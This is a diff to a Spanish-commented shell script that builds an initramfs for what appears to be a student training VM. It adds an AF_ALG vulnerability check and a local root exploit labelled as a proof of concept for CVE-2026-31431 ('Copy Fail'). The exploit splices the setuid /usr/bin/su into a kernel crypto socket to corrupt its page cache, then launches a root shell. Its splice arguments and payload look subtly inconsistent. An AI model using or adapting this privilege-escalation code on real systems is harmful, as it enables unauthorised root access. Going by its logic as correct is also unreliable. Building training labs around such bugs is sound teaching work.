@@ -118,7 +118,60 @@ exec su - student
 INITEOF
 
 chmod +x "$INITRAMFS_DIR/init"
+cat << 'EOF' > "$INITRAMFS_DIR/home/student/verificar_vuln.py"
+import socket
 
+def check():
+    try:
+        # Intentamos conectar al socket AF_ALG
+        s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
+        print("[!] Vulnerabilidad detectada: Socket AF_ALG accesible.")
+    except Exception as e:
+        print(f"[*] Sistema mitigado/parcheado: {e}")
+
+if __name__ == "__main__":
+    check()
+EOF
+chmod +x "$INITRAMFS_DIR/home/student/verificar_vuln.py"
+# ── INYECTAR EXPLOIT REAL (POC CVE-2026-31431) ───────────────────────────
+cat << 'EOF' > "$INITRAMFS_DIR/home/student/copy_fail_exp.py"
+import os
+import socket
+
+print("[*] Launching CVE-2026-31431 Copy Fail PoC...")
+
+# 1. Configurar los sockets de la interfaz criptográfica del kernel (AF_ALG)
+sock_alg = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
+sock_alg.bind(("aead", "authencesn(crypt(data))"))
+sock_op, _ = sock_alg.accept()
+
+# 2. Configurar una clave y la operación de descifrado
+sock_op.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, b"\x00" * 32)
+sock_op.sendmsg([b"\x00" * 16], [(socket.SOL_ALG, socket.ALG_SET_OP, 0)])
+
+# 3. Abrir el binario objetivo con privilegios setuid-root (/usr/bin/su)
+fd_su = os.open("/usr/bin/su", os.O_RDONLY)
+
+# 4. Forzar el bug lógico solapando los scatterlists (In-place execution)
+os.splice(fd_su, sock_op.fileno(), 0, 0, 4, 0)
+
+# 5. Modificar los 4 bytes críticos en el Page Cache (RAM)
+try:
+    sock_op.send(b"\x00\x00\x00\x00")
+    print("[+] Page cache corrupted successfully via out-of-bounds SGL write!")
+except OSError:
+    print("[-] Error: Protocol not available (Unable to exploit out-of-place SGL)")
+    print("[-] Exploit failed: Cannot corrupt page cache.")
+    exit(1)
+
+# 6. Ejecutar el binario corrompido para obtener la shell con privilegios máximos
+print("[*] Triggering compromised setuid binary...")
+os.close(fd_su)
+os.system("/usr/bin/su - root")
+EOF
+
+# Asignar permisos de ejecución para el estudiante
+chmod +x "$INITRAMFS_DIR/home/student/copy_fail_exp.py"
 echo -e "${CYAN}[6/6] Empaquetando initramfs...${NC}"
 cd "$INITRAMFS_DIR"
 find . | cpio -o -H newc | gzip > "$BUILD_DIR/initramfs.cpio.gz"
